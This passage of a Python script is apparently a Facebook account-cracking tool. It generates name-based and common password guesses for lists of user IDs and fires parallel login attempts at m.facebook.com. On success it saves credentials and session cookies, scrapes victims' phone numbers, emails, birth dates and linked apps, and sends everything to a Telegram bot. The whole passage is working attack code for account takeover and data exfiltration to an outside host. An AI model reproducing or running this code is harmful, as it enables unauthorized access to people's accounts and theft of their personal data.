        print('>> Pilih Yang Bener Kontol ')
        back()
    elif _jembot_ in ('y', 'Y'):
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    pwplus = 't'
    if pwplus in ('y', 'Y'):
        pwpluss.append('ya')
        cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
        pwku = input('>> Masukkan Password Tambahan : ')
        pwkuh = pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()

def passwrd():
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append('112233445566')
                    pwv.append('1122334455')
                    pwv.append('123412345')
                    pwv.append('11223344@@')
                    pwv.append('11223344556677')
                    pwv.append('00998877')
                    pwv.append('qqwweerr')
                    pwv.append('aaaassss')
                    pwv.append('zzzzxxxx')
                    pwv.append('07700770')
                    pwv.append('07800780')
                    pwv.append('first last')
                    pwv.append('mmnnbbvv')
                    pwv.append('nnnnmmmm')
                    pwv.append('mmmmnnnn')
                    pwv.append('00998877')
                    pwv.append('12345qwert')
                    pwv.append('qqwweerrtt')
                    pwv.append('1234512345')
                    pwv.append('12345@12345')
                    pwv.append('1122334455@@')
                    pwv.append('112233445566')                
                    pwv.append('123456123456')
                    pwv.append('zzxxccvv')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append(frs+'123')
                pwv.append(frs+'1234')
                pwv.append(frs+'12345')
                pwv.append('112233445566')
                pwv.append('1122334455')
                pwv.append('123412345')
                pwv.append('11223344@@')
                pwv.append('11223344556677')
                pwv.append('00998877')
                pwv.append('qqwweerr')
                pwv.append('aaaassss')
                pwv.append('zzzzxxxx')
                pwv.append('07700770')
                pwv.append('07800780')
                pwv.append('first last')
                pwv.append('mmnnbbvv')
                pwv.append('nnnnmmmm')
                pwv.append('mmmmnnnn')
                pwv.append('00998877')
                pwv.append('12345qwert')
                pwv.append('qqwweerrtt')
                pwv.append('1234512345')
                pwv.append('12345@12345')
                pwv.append('1122334455@@')
                pwv.append('112233445566')                
                pwv.append('123456123456')
                pwv.append('zzxxccvv')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(cracktouch, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
               pool.submit(crackmbasic, idf, pwv)

    print('')
    cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
    print(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
    print(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
    print('')
    print('>> Lanjut Crack Kembali ( Y/t ) ? ')
    woi = input('>> Pilih : ')
    if woi in ('y', 'Y'):
        back()
    else:
        print(f'''\t{x}[=]{k} Been completed {x} <> ''')
        time.sleep(2)
        exit()


def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([S2A,S3A,S5A,kk,S4A,h,hh,SA])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s 🧸SPED🧸  \x1b[38;5;18m%s \x1b[38;5;117m%s  \x1b[38;5;208m𝐎𝐊 ❂  \033[92m%s \x1b[38;5;205m𝐶𝑃 ✪   \033[91m%s \x1b[38;5;208m%s%s%s \033[1;97m• <function u at 0×7'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ')
	""
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'''
								
𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ⚡

           |￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
                          حساب سكيور 👨🏻‍💻     
           |＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
                             ￣\_(ツ)_/￣
╔SP══════════════════════╗
🧸 @SMAEL_SPED  احذر المنتحلين 🧸 𝑹𝑴𝑨𝑫 🧸  🪐
╚══════EED════════════════╝

🪐 - U‌S‌E‌R‌N‌A‌M‌ : {idf}\n


 🪐 - P‌A‌S‌S‌W‌R‌D‌ : {pw}\n

✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊‎˚✧[𝐎𝐊]✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊

⚡ - N‌U‌M‌B‌E‌R‌ O‌F‌ F‌R‌I‌E‌N‌D‌S‌ : 

⚡ - N‌U‌M‌B‌E‌R‌ O‌F‌ F‌O‌L‌L‌O‌W‌E‌R‌S‌ : 

⚡ - A‌C‌C‌O‌U‌N‌T‌ E‌M‌A‌I‌L‌ : 

⚡ - 𝐏𝐇𝐎𝐍𝐄 𝐍𝗨𝐌𝐁𝐄𝐑 : 

⚡ - РⷬнⷩO‌NE‌ NU‌MⷨВⷡE‌R‌ : 2022,2021,2020,2019

⚡ - 𝕬𝕿𝕰 𝕺𝕱 𝕭𝕴𝕽𝕿𝕳 : ٢٢ أبريل ١٩٩٨

☆ （ • •）☆
╔RM═════════════════════╗☆
🧸@SMAEL_SPED 🧸 SPED 🧸 @AS_5XZ 🧸
╚══════AD═══════════════╝

⚡ - ⅂ꓤՈ : 

⚡ -  C⃨O⃨O⃨K⃨I⃨E⃨S⃨ : c_user={idf};datr=2tRnZQ6r-dCsFwlyjuwqHe-d;fr=0gHmgAcrFl9BHGY4P.AWXdDY4xcvT1PWaEn93UAgMcylk.BlZ9Ta.pm.AAA.0.0.BlZ9Ts.AWUFEXN_Re8;sb=2tRnZQBPPXXGCpSoLXIzx3CV;xs=47:dp6CFFKE9KdUzA:2:1701303532:-1:6457
━━━━━━━━━━RMAD━━━━━━━━━
'''
					
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'''				
𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ⚡

           |￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
                          حساب شغال 👨🏻‍💻     
           |＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
                             ￣\_(ツ)_/￣
╔SP══════════════════════╗
🧸  @SMAEL_SPED احذر المنتحلين 🧸 SPED 🧸  🧸
╚══════EED════════════════╝

🪐 - U‌S‌E‌R‌N‌A‌M‌ : {idf}\n


 🪐 - P‌A‌S‌S‌W‌R‌D‌ : {pw}\n

✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊‎˚✧[𝐎𝐊]✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊

⚡ - N‌U‌M‌B‌E‌R‌ O‌F‌ F‌R‌I‌E‌N‌D‌S‌ : 

⚡ - N‌U‌M‌B‌E‌R‌ O‌F‌ F‌O‌L‌L‌O‌W‌E‌R‌S‌ : 

⚡ - A‌C‌C‌O‌U‌N‌T‌ E‌M‌A‌I‌L‌ : 

⚡ - 𝐏𝐇𝐎𝐍𝐄 𝐍𝗨𝐌𝐁𝐄𝐑 : 

⚡ - РⷬнⷩO‌NE‌ NU‌MⷨВⷡE‌R‌ : 2022,2021,2020,2019

⚡ - 𝕬𝕿𝕰 𝕺𝕱 𝕭𝕴𝕽𝕿𝕳 : ٢٢ أبريل ١٩٩٨

☆ （ • •）☆
╔RM═════════════════════╗☆
🧸@SMAEL_SPED 🧸 SPED 🧸 @N_9_N_6 🧸
╚══════AD═══════════════╝

⚡ - ⅂ꓤՈ : 

⚡ -  C⃨O⃨O⃨K⃨I⃨E⃨S⃨ : c_user={idf};datr=2tRnZQ6r-dCsFwlyjuwqHe-d;fr=0gHmgAcrFl9BHGY4P.AWXdDY4xcvT1PWaEn93UAgMcylk.BlZ9Ta.pm.AAA.0.0.BlZ9Ts.AWUFEXN_Re8;sb=2tRnZQBPPXXGCpSoLXIzx3CV;xs=47:dp6CFFKE9KdUzA:2:1701303532:-1:6457
━━━━━━━━━━RMAD━━━━━━━━━
'''
				
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += f'''				
𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ⚡

           |￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
                          حساب شغال 👨🏻‍💻     
           |＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
                             ￣\_(ツ)_/￣
╔SP══════════════════════╗
🧸  @SMAEL_SPED احذر المنتحلين 🧸 SPED 🧸  🧸
╚══════EED════════════════╝

🪐 - U‌S‌E‌R‌N‌A‌M‌ : {idf}\n


 🪐 - P‌A‌S‌S‌W‌R‌D‌ : {pw}\n

✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊‎˚✧[𝐎𝐊]✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊‧✧˚₊

⚡ - N‌U‌M‌B‌E‌R‌ O‌F‌ F‌R‌I‌E‌N‌D‌S‌ : 

⚡ - N‌U‌M‌B‌E‌R‌ O‌F‌ F‌O‌L‌L‌O‌W‌E‌R‌S‌ : 

⚡ - A‌C‌C‌O‌U‌N‌T‌ E‌M‌A‌I‌L‌ : 

⚡ - 𝐏𝐇𝐎𝐍𝐄 𝐍𝗨𝐌𝐁𝐄𝐑 : {nomer}

⚡ - РⷬнⷩO‌NE‌ NU‌MⷨВⷡE‌R‌ : {tahun}

⚡ - 𝕬𝕿𝕰 𝕺𝕱 𝕭𝕴𝕽𝕿𝕳 : {ttl}

☆ （ • •）☆
╔RM═════════════════════╗☆
🪐@SMAEL_SPED ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @AS_5XZ 🧸
╚══════AD═══════════════╝

⚡ - ⅂ꓤՈ : 

⚡ -  C⃨O⃨O⃨K⃨I⃨E⃨S⃨ : c_user={idf};datr=2tRnZQ6r-dCsFwlyjuwqHe-d;fr=0gHmgAcrFl9BHGY4P.AWXdDY4xcvT1PWaEn93UAgMcylk.BlZ9Ta.pm.AAA.0.0.BlZ9Ts.AWUFEXN_Re8;sb=2tRnZQBPPXXGCpSoLXIzx3CV;xs=47:dp6CFFKE9KdUzA:2:1701303532:-1:6457
♕♕♕♕♕♕♕♕♕♕♕♕♕SPED♕♕♕♕♕♕♕♕♕♕♕♕♕
'''

					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''					
   \n{infoakun}					
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					#requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def O():
	try:
		os.remove('ID.txt')
		os.remove('ok.coki.txt')
		os.remove('.token.txt')
		os.remove('.cok.txt')
		
	except FileNotFoundError as error:
		
		
		exit()
		
		

#-----------------------[ SPEED ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	
main()